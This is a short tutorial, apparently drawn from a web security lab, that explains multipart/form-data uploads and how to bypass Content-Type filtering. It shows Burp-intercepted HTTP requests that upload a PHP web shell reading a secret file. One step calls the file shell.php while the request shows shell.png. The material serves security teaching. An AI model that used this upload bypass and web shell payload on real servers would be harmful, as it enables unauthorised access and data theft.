When submitting HTML forms, the browser typically sends the provided data in `POST` HTTP request with the `Content-Type` value of `application/x-www-form-url-encoded`. Most of the time this works, however it isn't suitable for sending large amounts of binary data, such as an image or PDF file. In this case the `multipart/form-data` is more suitable.

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting the form will result in a request like this:
```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.
```
Notice that the message body is split into separate parts for each of the form's inputs, where each part contains `Content-Disposition` header that provides basic information about the input field it relates to. These parts may also contain `Content-Type` header, which tells the server the MIME type of the data being submitted.

However, using `Content-Type` filtering alone isn't secure at all, specially if the server implicitly trusts the value of this header, as this can be bypassed entirely:
1. Using Burp Proxy, intercept the request. Observe that the `Content-Type` is set to `text/x-php` and `filename` parameter to `shell.php`
 ```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="shell.png"
Content-Type: text/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
2. Modify the contents of `Content-Type` to `image/jpeg` and `filename` to `shell.jpg` then click **Forward**.
```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="shell.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
3. Notice that the application allowed the file to be uploaded, all an attacker have to do is open the uploaded file in the browser and the web shell will be activated